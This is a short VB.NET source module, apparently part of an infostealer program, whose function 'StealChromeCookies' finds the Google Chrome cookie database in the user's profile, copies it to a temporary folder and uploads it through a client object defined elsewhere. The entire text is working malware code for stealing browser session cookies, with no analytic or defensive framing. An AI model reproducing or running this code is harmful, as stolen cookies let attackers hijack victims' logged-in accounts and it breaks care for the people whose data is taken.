Imports System.IO
Module ChromeCookies
    Public Function StealChromeCookies()
        Try
            Dim chromeData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\"
            If File.Exists(chromeData & "Cookies") Then
                File.Copy(chromeData & "Cookies", Form1.TempPath & "\" & "CookiesCh.sqlite")
                Form1.C.Upload(Form1.TempPath & "\" & "CookiesCh.sqlite")
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
End Module
